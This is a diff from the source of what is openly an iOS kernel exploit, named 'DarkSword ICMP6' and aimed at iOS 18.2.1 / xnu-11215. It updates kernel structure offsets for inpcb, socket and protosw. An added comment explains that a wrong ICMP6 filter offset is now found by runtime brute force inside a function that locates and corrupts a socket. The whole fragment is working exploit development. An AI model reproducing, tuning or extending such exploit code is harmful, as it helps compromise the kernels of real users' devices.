@@ -18,16 +18,24 @@
 // ===== DarkSword ICMP6 exploit offsets =====
 // VERIFIED for iOS 18.2.1 / xnu-11215 (darksword-kexploit-main, "OFFICIAL
 // CORRECTED OFFSETS ... XNU-11215.61.5 source struct compilation"):
-//   OFFSET_ICMP6FILT = 0x138 (0x150 was a stale +0x18 inner-struct bug)
 //   OFFSET_SOCKET_SO_COUNT = 0x208 (so_retaincnt; was 0x228 pre-XNU-11215,
 //      moved to 0x254 in iOS 18.4 / xnu-11417 per Kev1nLevin disasm)
 //   OFFSET_SO_PROTO = 0x20 (was 0x18, moved +0x08 in XNU-11215)
 // Cross-check (iOS 18.4 / xnu-11417): ICMP6FILT 0x138, SO_COUNT 0x254,
 // SO_PROTO 0x20, PR_INPUT 0x20 -- so ICMP6FILT/SO_PROTO are stable across
 // the 18.x line; only SO_COUNT differs (0x208 here vs 0x254 on 18.4+).
+//
+// NOTE: OFFSET_ICMP6FILT (0x138) is PROVEN WRONG on this device/kernel
+// (xnu-11215 / iOS 18.2.1 / iPhone 12 A14): every inpcb slot dump shows
+// filt(+0x138)=0 yet every socket's getsockopt(ICMP6_FILTER) succeeds with
+// the all-ones fresh filter (a NULL in6p_icmp6filt would return EINVAL).
+// The real offset lives in the inp_depend6 union region and is now discovered
+// empirically at runtime by find_and_corrupt_socket() (brute-force oracle
+// 0x88..0x208), stored in gIcmp6FiltOffset. 0x138 remains only as the
+// pre-discovery fallback value.
 #define OFFSET_PCB_SOCKET      0x40   // inpcb -> socket (unchanged 15.x-18.4)
 #define OFFSET_SOCKET_SO_COUNT 0x208  // socket so_retaincnt (iOS 18.0-18.3.x)
-#define OFFSET_ICMP6FILT       0x138  // inpcb icmp6_filter pointer (18.x)
+#define OFFSET_ICMP6FILT       0x138  // inpcb icmp6_filter pointer (18.x) -- fallback; real offset brute-forced at runtime
 #define OFFSET_SO_PROTO        0x20   // socket -> protosw (18.x)
 #define OFFSET_PR_INPUT        0x28   // protosw -> pr_input (18.2.x)
 
